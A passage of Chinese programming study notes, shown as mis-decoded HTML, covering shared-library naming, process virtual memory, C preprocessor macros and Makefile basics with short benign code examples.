ä¸»ç‰ˆæœ¬å·ä¸€è‡´å³å¯ä¿è¯åº“å‡½æ•°çš„æ¥å£ä¸€è‡´, å¯æ‰§è¡Œæ–‡ä»¶çš„ <code>.dynamic</code> æ®µåªè®°å½•å…±äº«åº“çš„ soname, åŠ¨æ€é“¾æ¥å™¨åªè¦æ‰¾åˆ° soname ä¸€è‡´çš„å…±äº«åº“å°±å¯ä»¥åŠ è½½å®ƒåšåŠ¨æ€é“¾æ¥. å¦‚: libcap.so.1</p><p>ä½¿ç”¨å…±äº«åº“å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å‡çº§åº“æ–‡ä»¶è€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘ç¨‹åº.</p><p>libc çš„ç‰ˆæœ¬ç¼–å·æœ‰ä¸€ç‚¹ç‰¹æ®Š, libc-2.8.90.so çš„ä¸»ç‰ˆæœ¬å·æ˜¯ 6 è€Œä¸æ˜¯ 2 æˆ– 2.8 </p><p>linker name ä»…åœ¨ç¼–è¯‘é“¾æ¥æ—¶ä½¿ç”¨, gcc çš„ <code>-L</code> é€‰é¡¹åº”è¯¥æŒ‡å®š linker name æ‰€åœ¨çš„ç›®å½•. æœ‰çš„ linker name æ˜¯åº“æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥, æœ‰çš„ linker name æ˜¯ä¸€æ®µé“¾æ¥è„šæœ¬.</p><p>ç¼–è¯‘å™¨åªè®¤ linker name.</p><h2 id="19-5-è™šæ‹Ÿå†…å­˜ç®¡ç†"><a href="#19-5-è™šæ‹Ÿå†…å­˜ç®¡ç†" class="headerlink" title="19.5 è™šæ‹Ÿå†…å­˜ç®¡ç†"></a>19.5 è™šæ‹Ÿå†…å­˜ç®¡ç†</h2><p><code>/proc</code> ç›®å½•ä¸‹çš„æ–‡ä»¶å¹¶ä¸æ˜¯çœŸæ­£çš„ç£ç›˜æ–‡ä»¶, è€Œæ˜¯å†…æ ¸è™šæ‹Ÿå‡ºæ¥çš„, å½“å‰æ¯ä¸ªè¿è¡Œçš„è¿›ç¨‹åœ¨ <code>/proc</code> ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªå­ç›®å½•, ç›®å½•åå°±æ˜¯è¿›ç¨‹çš„ id. <code>/proc/[id]/maps</code> æ–‡ä»¶æ˜¯è¿›ç¨‹åœ°å€ç©ºé—´çš„ä¿¡æ¯.</p><p>x86 å¹³å°çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯ <code>0x00000000~0xffffffff</code>, å¤§è‡´ä¸Šå‰ 3GB (<code>0x00000000~0xbfffffff</code>) æ˜¯ç”¨æˆ·ç©ºé—´, å 1GB (<code>0xc0000000~0xffffffff</code>) æ˜¯å†…æ ¸ç©ºé—´.</p><p><code>0x09283000~0x09497000</code> ä¸æ˜¯ä»ç£ç›˜æ–‡ä»¶åŠ è½½åˆ°å†…å­˜çš„, è¿™æ®µç©ºé—´ç§°ä¸º <mark>å †</mark> (Heap), ä» <code>0x7ca8000</code> å¼€å§‹æ˜¯å…±äº«åº“çš„æ˜ å°„ç©ºé—´, æ¯ä¸ªå…±äº«åº“ä¹Ÿåˆ†æˆå‡ ä¸ª Segment, æ¯ä¸ª Segment æœ‰ä¸åŒçš„è®¿é—®æƒé™.</p><p>å †ç©ºé—´çš„åœ°å€ä¸Šé™ (<code>0x9479000</code>) ç§°ä¸º Break, å †ç©ºé—´è¦å‘é«˜åœ°å€å¢é•¿å°±è¦æŠ¬é«˜ Break, æ˜ å°„æ–°çš„è™šæ‹Ÿå†…å­˜é¡µé¢åˆ°ç‰©ç†å†…å­˜, è¿™æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ <code>brk</code> å®ç°çš„, <code>malloc</code> å‡½æ•°ä¹Ÿæ˜¯è°ƒç”¨ <code>brk</code> å‘å†…æ ¸è¯·æ±‚åˆ†é…å†…å­˜. </p><p><code>0xbfac5000~0bfada000</code> æ˜¯æ ˆç©ºé—´, å…¶ä¸­é«˜åœ°å€éƒ¨åˆ†ä¿å­˜è¿™è¿›ç¨‹çš„ç¯å¢ƒå˜é‡å’Œå‘½ä»¤è¡Œå‚æ•°, ä½åœ°å€éƒ¨åˆ†æ˜¯æ ˆç©ºé—´.</p><p>æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜ç®¡ç†æœºåˆ¶çš„ä½œç”¨ (å…·ä½“è§ä¹¦):</p><ul><li>æ§åˆ¶ç‰©ç†å†…å­˜çš„è®¿é—®æƒé™, ç‰©ç†å†…å­˜æœ¬èº«æ˜¯ä¸é™åˆ¶è®¿é—®çš„.</li><li>ä½¿æ¯ä¸ªè¿›ç¨‹æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´, ä¸åŒè¿›ç¨‹ä¸­ç›¸åŒçš„ VA (Virtual Address) è¢« MMU æ˜ å°„åˆ°ä¸åŒçš„ PA (Physic Address).</li><li>VA åˆ° PA çš„æ˜ å°„ä¼šç»™åˆ†é…å’Œé‡Šæ”¾å†…å­˜å¸¦æ¥æ–¹ä¾¿, ç‰©ç†åœ°å€ä¸è¿ç»­çš„å‡ å—å†…å­˜å¯ä»¥æ˜ å°„æˆè™šæ‹Ÿåœ°å€è¿ç»­çš„ä¸€å—å†…å­˜.</li><li>ä¸€ä¸ªç³»ç»Ÿå¦‚æœåŒæ—¶è¿è¡Œç€å¾ˆå¤šè¿›ç¨‹, ä¸ºå„è¿›ç¨‹åˆ†é…çš„å†…å­˜ä¹‹å’Œå¯èƒ½ä¼šå¤§äºå®é™…å¯ç”¨çš„ç‰©ç†å†…å­˜, è™šæ‹Ÿå†…å­˜ç®¡ç†æœºåˆ¶ä½¿è¿™ç§æƒ…å†µä¸‹å„è¿›ç¨‹ä»ç„¶èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ.</li></ul><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ä¸€å¥— VA åˆ° PA çš„æ˜ å°„è¡¨, åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­é€šè¿‡ VA åªèƒ½è®¿é—®åˆ°å±äºè‡ªå·±çš„ç‰©ç†é¡µé¢.</p><p>ä¸¤ä¸ªè¿›ç¨‹çš„å…±äº«åº“åŠ è½½åœ°å€å¹¶ä¸ç›¸åŒ, å…±äº«åº“åŠ è½½åœ°å€æ˜¯åœ¨åŠ¨æ€é“¾æ¥æ—¶ç¡®å®šçš„. ä½¿ç”¨å…±äº«åº“å¯ä»¥èŠ‚çœç‰©ç†å†…å­˜, æ¯”å¦‚ libc, ç³»ç»Ÿä¸­å‡ ä¹æ‰€æœ‰çš„è¿›ç¨‹éƒ½å°† libc æ˜ å°„åˆ°è‡ªå·±çš„è¿›ç¨‹ç©ºé—´, è€Œ libc çš„åªè¯»éƒ¨åˆ†åœ¨ç‰©ç†å†…å­˜ä¸­åªéœ€è¦å­˜åœ¨ä¸€ä»½å°±å¯ä»¥è¢«æ‰€æœ‰è¿›ç¨‹å…±äº«, è¿™å°±æ˜¯ â€œå…±äº«åº“â€ è¿™ä¸ªåç§°çš„ç”±æ¥.</p><p>åœ¨ç£ç›˜ä¸Šå¼€ä¸€ä¸ªåˆ†åŒºæˆ–è€…å»ºä¸€ä¸ªæ–‡ä»¶ä¸“é—¨ç”¨äºä¸´æ—¶ä¿å­˜è™šæ‹Ÿå†…å­˜é¡µé¢çš„æ•°æ®, è¿™è¢«ç§°ä¸ºäº¤æ¢è®¾å¤‡ (Swap Device).</p><h1 id="ç¬¬20ç« -é¢„å¤„ç†"><a href="#ç¬¬20ç« -é¢„å¤„ç†" class="headerlink" title="ç¬¬20ç«  é¢„å¤„ç†"></a>ç¬¬20ç«  é¢„å¤„ç†</h1><h2 id="20-1-é¢„å¤„ç†çš„æ­¥éª¤"><a href="#20-1-é¢„å¤„ç†çš„æ­¥éª¤" class="headerlink" title="20.1 é¢„å¤„ç†çš„æ­¥éª¤"></a>20.1 é¢„å¤„ç†çš„æ­¥éª¤</h2><p>é¢„å¤„ç†å™¨æŠŠæ¯ä¸ªé€»è¾‘ä»£ç åˆ’åˆ†æˆ Token å’Œç©ºç™½å­—ç¬¦, è¿™æ—¶ Token ç§°ä¸ºé¢„å¤„ç† Token. åœ¨åˆ’åˆ† Token æ—¶è¦éµå¾ªæœ€é•¿åŒ¹é…åŸåˆ™.</p><p>åœ¨ Token ä¸­è¯†åˆ«å‡ºå®å®šä¹‰å’Œé¢„å¤„ç†æŒ‡ç¤º, å¦‚æœé‡åˆ°å®å®šä¹‰åˆ™åšå®å±•å¼€, é‡åˆ°é¢„å¤„ç†æŒ‡ç¤ºåˆ™ä½œå‡ºç›¸åº”çš„ä¸å¤„ç†åŠ¨ä½œ.</p><p>æ­¤å¤„ä¹‹è®°å½•äº†éƒ¨åˆ†æ­¥éª¤.</p><p>æ‰¾å‡ºå­—ç¬¦å¸¸é‡æˆ–å­—ç¬¦ä¸²å­—é¢å€¼ä¸­çš„è½¬ç§»åºåˆ—, ç”¨ç›¸åº”çš„å­—èŠ‚æ¥æ›¿æ¢å®ƒ, æ¯”å¦‚æŠŠ <code>\n</code> æ›¿æ¢æˆ <code>0x0a</code>.</p><p>æŠŠç›¸é‚»çš„å­—ç¬¦ä¸²å­—é¢å€¼è¿æ¥èµ·æ¥.</p><p>æŠŠä¸€ä¸ªé¢„å¤„ç†æŒ‡ç¤ºå†™æˆå¤šè¡Œè¦ç”¨ <code>\</code> ç»­è¡Œ, å› ä¸ºæ ¹æ®å®šä¹‰, ä¸€æ¡é¢„å¤„ç†æŒ‡ç¤ºåªèƒ½ç”±ä¸€ä¸ªé€»è¾‘ä»£ç è¡Œç»„æˆ, è€ŒæŠŠ C ä»£ç å†™æˆå¤šè¡Œåˆ™ä¸å¿…ç”¨ <code>\</code> ç»­è¡Œ, å› ä¸ºæ¢è¡Œåœ¨ C ä»£ç ä¸­åªä¸è¿‡æ˜¯ä¸€ç§ç©ºç™½å­—ç¬¦.</p><h2 id="20-2-å®å®šä¹‰"><a href="#20-2-å®å®šä¹‰" class="headerlink" title="20.2 å®å®šä¹‰"></a>20.2 å®å®šä¹‰</h2><h3 id="20-2-1-å‡½æ•°å¼å®å®šä¹‰"><a href="#20-2-1-å‡½æ•°å¼å®å®šä¹‰" class="headerlink" title="20.2.1 å‡½æ•°å¼å®å®šä¹‰"></a>20.2.1 å‡½æ•°å¼å®å®šä¹‰</h3><p>å˜é‡å¼å®å®šä¹‰ (Object-like Macro), å¦‚:</p><ul><li><code>#define N 20</code></li><li><code>#define STR &quot;hello world&quot;</code></li></ul><p>å‡½æ•°å¼å®å®šä¹‰ (Function-like Macro), å¦‚:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">#define MAX(<span class="hljs-name">a</span>, b) ((<span class="hljs-name">a</span>)&gt;(<span class="hljs-name">b</span>)?(<span class="hljs-name">a</span>):(<span class="hljs-name">b</span>))<br></code></pre></td></tr></table></figure><p>ç”¨ gcc çš„ <code>-E</code> é€‰é¡¹æˆ–è€…ç”¨ cpp å¤„ç†.</p><p>å‡½æ•°å¼å®å®šä¹‰å’ŒçœŸæ­£çš„å‡½æ•°è°ƒç”¨åŒºåˆ«:</p><ul><li>å‡½æ•°å¼å®šä¹‰å®çš„å‚æ•°æ²¡æœ‰ç±»å‹, é¢„å¤„ç†å™¨åªè¿›è¡Œå½¢å¼ä¸Šçš„æ›¿æ¢, è€Œä¸åšå‚æ•°ç±»å‹æ£€æŸ¥</li><li>è°ƒç”¨çœŸæ­£çš„å‡½æ•°å’Œè°ƒç”¨å‡½æ•°å¼å®šä¹‰å®çš„ä»£ç ç¼–è¯‘ç”Ÿæˆçš„æŒ‡ä»¤ä¸åŒ. ä½¿ç”¨å‡½æ•°å¼å®šä¹‰å®ç¼–è¯‘ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¼šæ¯”è¾ƒå¤§.</li></ul><p>ä¸€èˆ¬æ¥è¯´, ç®€çŸ­çš„, è¢«é¢‘ç¹è°ƒç”¨çš„å‡½æ•°é€‚åˆç”¨å‡½æ•°å¼å®å®šä¹‰æ¥ä»£æ›¿å®ç°.</p><p>å‡½æ•°å¼å®šä¹‰ç»å¸¸å†™æˆä»¥ä¸‹å½¢å¼ (å†…æ ¸ä»£ç  <code>include/linux/pm.h</code>):</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#define device<span class="hljs-constructor">_init_wekeup(<span class="hljs-params">dev</span>,<span class="hljs-params">val</span>)</span> \<br>        <span class="hljs-keyword">do</span> &#123; \<br>                device<span class="hljs-constructor">_can_wekeup(<span class="hljs-params">dev</span>)</span> = !!(var); \<br>                device<span class="hljs-constructor">_set_wekeup_enable(<span class="hljs-params">dev</span>,<span class="hljs-params">val</span>)</span>; \<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h3 id="20-2-2-å†…è”å‡½æ•°"><a href="#20-2-2-å†…è”å‡½æ•°" class="headerlink" title="20.2.2 å†…è”å‡½æ•°"></a>20.2.2 å†…è”å‡½æ•°</h3><p>C99 å¼•å…¥çš„æ–°å…³é”®å­— <code>inline</code>, ç”¨äºå®šä¹‰å†…è”å‡½æ•° (Inline Function).</p><p>å¦‚:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">static inline void <span class="hljs-built_in">down_read</span>(struct rw_semaphore *sem)<br>&#123;<br>        <span class="hljs-built_in">might_sleep</span>();<br>        <span class="hljs-built_in">rwsemtrace</span>(sem,&quot;Entering down_read&quot;);<br>        <span class="hljs-built_in">__down_read</span>(sem);<br>        <span class="hljs-built_in">rwsemtrace</span>(sem,&quot;Leaving down_read&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>inline</code> å…³é”®å­—å‘Šè¯‰ç¼–è¯‘å™¨, è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨è¦å°½å¯èƒ½å¿«, å¯ä»¥å½“æ™®é€šçš„å‡½æ•°è°ƒç”¨å®ç°, ä¹Ÿå¯ä»¥ç”¨å®å±•å¼€çš„æ–¹æ³•å®ç°.</p><h3 id="20-2-3-è¿ç®—ç¬¦å’Œå¯å˜å‚æ•°"><a href="#20-2-3-è¿ç®—ç¬¦å’Œå¯å˜å‚æ•°" class="headerlink" title="20.2.3 #, ## è¿ç®—ç¬¦å’Œå¯å˜å‚æ•°"></a>20.2.3 #, ## è¿ç®—ç¬¦å’Œå¯å˜å‚æ•°</h3><p>æœ‰:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">PSQR</span>(X) <span class="hljs-built_in">printf</span>(&quot;The square of X is %d.\n&quot;, ((X)*(X)));<br><span class="hljs-built_in">PSQR</span>(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„è¾“å‡ºç»“æœä¸º:</p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mercury">The square of X <span class="hljs-keyword">is</span> <span class="hljs-number">64</span>.<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨ <code>#</code>:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">PSQR</span>(X) <span class="hljs-built_in">printf</span>(&quot;The square of #X is %d.\n&quot;, ((X)*(X)));<br><span class="hljs-built_in">PSQR</span>(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>åˆ™è¾“å‡ºç»“æœä¸º:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">The</span> square of <span class="hljs-number">8</span> is <span class="hljs-number">64</span>.<br></code></pre></td></tr></table></figure><p>å°†å½¢å‚å¯¹åº”çš„å‚æ•°æ›¿æ¢ä¸ºäº†ç›¸åº”çš„å­—ç¬¦ä¸².</p><p><code>##</code> ç”¨äºæŠŠå‰åä¸¤ä¸ª Token è¿æ¥æˆä¸€ä¸ªé¢„å¤„ç† Token.</p><p>å¦‚:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">CONCAT</span>(<span class="hljs-selector-tag">a</span>, b) a#<span class="hljs-selector-id">#b</span><br><span class="hljs-function"><span class="hljs-title">CONCAT</span><span class="hljs-params">(con, cat)</span></span><br></code></pre></td></tr></table></figure><p>çš„ç»“æœå°±æ˜¯ <code>concat</code>.</p><p>å‡½æ•°å¼å®å®šä¹‰ä¹Ÿå¯ä»¥å¸¦å¯å˜å‚æ•°, åŒæ ·æ˜¯åœ¨å‚æ•°åˆ—è¡¨ä¸­ç”¨ <code>...</code> è¡¨ç¤ºå¯å˜å‚æ•°.</p><p>å¦‚:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">showlist</span>(...) <span class="hljs-built_in">printf</span>(#__VA_ARGS__)<br></code></pre></td></tr></table></figure><p>å®å®šä¹‰ä¸­å¯å˜å‚æ•°éƒ¨åˆ†ç”¨ <code>__VA_ARGS__</code> è¡¨ç¤º, åœ¨å®å±•å¼€æ—¶å’Œ <code>...</code> å¯¹åº”çš„å‡ ä¸ªå®å‚å¯ä»¥çœ‹æˆä¸€ä¸ªå®å‚æ¥æ›¿æ¢æ‰ <code>__VA_ARGS__</code>.</p><p>è°ƒç”¨å‡½æ•°å¼å®å®šä¹‰å…è®¸ä¼ ç©ºå‚æ•°.</p><p>åœ¨å®šä¹‰æ—¶å¸¦ä¸‰ä¸ªå‚æ•°, åœ¨è°ƒç”¨æ—¶ä¹Ÿå¿…é¡»ç»™å®ƒä¼ ä¸‰ä¸ªå‚æ•°, ç©ºå‚æ•°çš„ä½ç½®å¯ä»¥ç©ºç€, ä½†å¿…é¡»ç»™è¶³ä¸‰ä¸ªå‚æ•°:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">FOO</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c) a##b#<span class="hljs-selector-id">#c</span><br><span class="hljs-function"><span class="hljs-title">FOO</span><span class="hljs-params">(,,<span class="hljs-number">3</span>)</span></span><br></code></pre></td></tr></table></figure><h3 id="20-2-4-undef-é¢„å¤„ç†æŒ‡ç¤º"><a href="#20-2-4-undef-é¢„å¤„ç†æŒ‡ç¤º" class="headerlink" title="20.2.4 #undef é¢„å¤„ç†æŒ‡ç¤º"></a>20.2.4 #undef é¢„å¤„ç†æŒ‡ç¤º</h3><p>å¦‚æœåœ¨ä¸€ä¸ªç¼–è¯‘å•å…ƒä¸­é‡å¤å®šä¹‰ä¸€ä¸ªå®, C è¯­è¨€è§„å®šè¿™äº›é‡å¤çš„å®å®šä¹‰å¿…é¡»ä¸€æ¨¡ä¸€æ ·.</p><p>å¯ä»¥ç”¨ <code>#undef</code> å–æ¶ˆåŸæ¥å®šä¹‰çš„å®.</p><h3 id="20-2-5-å®å±•å¼€çš„æ­¥éª¤"><a href="#20-2-5-å®å±•å¼€çš„æ­¥éª¤" class="headerlink" title="20.2.5 å®å±•å¼€çš„æ­¥éª¤"></a>20.2.5 å®å±•å¼€çš„æ­¥éª¤</h3><h2 id="20-3-æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º"><a href="#20-3-æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º" class="headerlink" title="20.3 æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º"></a>20.3 æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º</h2><p>æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤ºä¹Ÿå¸¸ç”¨äºæºä»£ç çš„é…ç½®ç®¡ç†:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">if</span> MACHINE == 68000</span><br><span class="hljs-type">int</span> x;<br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> MACHINE == 8086</span><br><span class="hljs-type">long</span> x;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span> </span><br>    <span class="hljs-meta">#<span class="hljs-keyword">error</span> UNKOWN TARGET MACHINE</span><br> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><code>#ifdef</code> æˆ–  <code>#if</code> å¯ä»¥åµŒå¥—ä½¿ç”¨, ä½†é¢„å¤„ç†æŒ‡ç¤ºé€šå¸¸éƒ½é¡¶å¤´å†™ä¸ç¼©è¿›.</p><p>gcc çš„ <code>-D</code> é€‰é¡¹å¯ä»¥å®šä¹‰å®.</p><h2 id="20-4-å…¶ä»–é¢„å¤„ç†ç‰¹æ€§"><a href="#20-4-å…¶ä»–é¢„å¤„ç†ç‰¹æ€§" class="headerlink" title="20.4 å…¶ä»–é¢„å¤„ç†ç‰¹æ€§"></a>20.4 å…¶ä»–é¢„å¤„ç†ç‰¹æ€§</h2><p><code>#pragma</code> æä¾›çš„æ‰©å±•ç‰¹æ€§æ˜¯ç”±ç¼–è¯‘å™¨è‡ªå·±è§„å®šçš„.</p><p>C æ ‡å‡†è§„å®šäº†å‡ ä¸ªç‰¹æ®Šçš„å®, ä¸éœ€è¦å®šä¹‰å³å¯ä½¿ç”¨:</p><ul><li><code>__FILE__</code>, å±•å¼€æˆå½“å‰æºæ–‡ä»¶çš„æ–‡ä»¶å, æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</li><li><code>__LINE__</code>, å±•å¼€æˆå½“å‰ä»£ç è¡Œçš„è¡Œå·, æ˜¯ä¸€ä¸ªæ•´æ•°</li></ul><p>C æ ‡å‡†è§„å®š, assert åº”è¯¥å®ç°æˆå‡½æ•°å¼å®å®šä¹‰è€Œä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„å‡½æ•°, å¹¶ä¸” <code>assert(test)</code> è¿™ä¸ªè¡¨è¾¾å¼åº”è¯¥æ˜¯ void ç±»å‹.</p><p><code>((void)0)</code> è¡¨ç¤ºä¸€ä¸ª void ç±»å‹çš„å€¼.</p><h1 id="ç¬¬21ç« -Makefile-åŸºç¡€"><a href="#ç¬¬21ç« -Makefile-åŸºç¡€" class="headerlink" title="ç¬¬21ç«  Makefile åŸºç¡€"></a>ç¬¬21ç«  Makefile åŸºç¡€</h1><p>å¯¹äº Makefile ä¸­æ¯ä¸ªä»¥ Tab å¼€å¤´çš„å‘½ä»¤, make ä¼šå¯åŠ¨ä¸€ä¸ª Shell è¿›ç¨‹å»æ‰§è¡Œå®ƒ.</p><p>åœ¨å‘½ä»¤å‰é¢åŠ  <code>@</code> å’Œ <code>-</code> çš„æ•ˆæœ:</p><ul><li><code>@</code> (At Sign), ä¸æ˜¾ç¤ºå‘½ä»¤æœ¬èº«è€Œåªæ˜¾ç¤ºå®ƒçš„è¾“å‡ºç»“æœ </li><li><code>-</code> (Hyphen), å³ä½¿å‘½ä»¤å‡ºé”™, make ä¹Ÿä¼šç»§ç»­æ‰§è¡Œåç»­ä»»åŠ¡</li></ul><p>é€šå¸¸ <code>rm</code> å’Œ <code>mkdir</code> å‘½ä»¤å‰é¢è¦åŠ ä¸Š <code>-</code> å­—ç¬¦, å› ä¸º <code>rm</code> è¦åˆ é™¤çš„æ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨, <code>mkdir</code> è¦åˆ›å»ºçš„æ–‡ä»¶å¯èƒ½å·²ç»å­˜åœ¨.</p><p><code>.PHONY</code> å£°æ˜ä¸€ä¸ªä¼ªç›®æ ‡, é¿å…å’Œæ–‡ä»¶åé‡å.</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">clean:</span><br>        -rm main *.o <br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br></code></pre></td></tr></table></figure><p>å†™åœ¨åé¢ä¹Ÿæœ‰æ•ˆ.</p><h2 id="21-2-éšå«è§„åˆ™å’Œæ¨¡å¼è§„åˆ™"><a href="#21-2-éšå«è§„åˆ™å’Œæ¨¡å¼è§„åˆ™" class="headerlink" title="21.2 éšå«è§„åˆ™å’Œæ¨¡å¼è§„åˆ™"></a>21.2 éšå«è§„åˆ™å’Œæ¨¡å¼è§„åˆ™</h2><p>å¯ä»¥æŠŠä¸€ä¸ªç›®æ ‡æ‹†å¼€å†™æˆå¤šæ¡è§„åˆ™, å…¶ä¸­åªæœ‰ä¸€æ¡è§„åˆ™å…è®¸æœ‰æ–‡ä»¶åˆ—è¡¨.</p><p>å¦‚æœä¸€ä¸ªç›®æ ‡åœ¨ Makefile ä¸­çš„æ‰€æœ‰è§„åˆ™éƒ½æ²¡æœ‰å‘½ä»¤åˆ—è¡¨, make ä¼šå°è¯•åœ¨å†…å»ºçš„éšå«è§„åˆ™ (Implicit Rule) æ•°æ®åº“ä¸­æŸ¥æ‰¾é€‚ç”¨çš„è§„åˆ™.</p><p>make çš„éšå«è§„åˆ™æ•°æ®åº“å¯ä»¥ç”¨ <code>make -p</code> å‘½ä»¤æ‰“å°å‡ºæ¥.</p><p>Makefile å˜é‡å°±åƒç¯å¢ƒå˜é‡æˆ–è€… C è¯­è¨€çš„å®å®šä¹‰ä¸€æ ·, ä»£è¡¨ä¸€ä¸²å­—ç¬¦ (æˆ–è€…ç©ºå­—ç¬¦ä¸²), å¹¶ä¸”æŒ‰ç…§æƒ¯ä¾‹é€šå¸¸ç”¨å¤§å†™å­—æ¯åŠ ä¸‹åˆ’çº¿å‘½å.</p><p>å˜é‡ååŠ ä¸Šæ‹¬å·å’Œ <code>$</code> (Dollar Sign) è¡¨ç¤ºå°†å˜é‡å€¼å±•å¼€:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$(<span class="hljs-keyword">VAR</span>)<br></code></pre></td></tr></table></figure><p><code>%</code> åœ¨ Makefile è¯­æ³•ä¸­è¡¨ç¤º 0 ä¸ªæˆ–å¤šä¸ªåŒ¹é…é¡¹.</p><p><code>$@</code> å’Œ <code>$&lt;</code> è¿™ä¸¤ä¸ªç‰¹æ®Šå˜é‡:</p><ul><li><code>$@</code>, å–å€¼æ˜¯å½“å‰è§„åˆ™ä¸­çš„ç›®æ ‡</li><li><code>$&lt;</code>, å–å€¼æ˜¯å½“å‰è§„åˆ™ä¸­çš„ç¬¬ä¸€ä¸ªæ¡ä»¶</li></ul><p><code>%.o: %.c</code> æ˜¯æ¨¡å¼è§„åˆ™ (Pattern Rule).</p><p>å¤šç›®æ ‡:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">target1 target2: prerequisitel1 prerequisitel2<br>    <span class="hljs-built_in">command</span> $&lt; -o <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><p>ç›¸å½“äº:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">target</span><span class="hljs-number">1</span>: prerequisitel<span class="hljs-number">1</span> prerequisitel<span class="hljs-number">2</span><br>    command prerequisitel<span class="hljs-number">1</span> -o <span class="hljs-keyword">target</span><span class="hljs-number">1</span><br><br><span class="hljs-keyword">target</span><span class="hljs-number">2</span>: prerequisitel<span class="hljs-number">1</span> prerequisitel<span class="hljs-number">2</span><br>    command prerequisitel<span class="hljs-number">1</span> -o <span class="hljs-keyword">target</span><span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><p>make å¤„ç† Makefile çš„è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µ:</p><ul><li>æ ¹æ®è§„åˆ™å»ºç«‹ä»¥æ¥å…³ç³»å›¾</li><li>æ ¹æ®ä¾èµ–å…³ç³»å›¾é€‰æ‹©é€‚å½“çš„è§„åˆ™æ‰§è¡Œ</li></ul><p>é€šå¸¸æŠŠ <code>CFLAGS</code> å®šä¹‰æˆä¸€äº›ç¼–è¯‘é€‰é¡¹.</p><p>é€šå¸¸æŠŠ <code>CPPFLAGS</code> å®šä¹‰æˆä¸€äº›é¢„å¤„ç†é€‰é¡¹.</p><p><code>:=</code> æ“ä½œç¬¦è¡¨ç¤º, 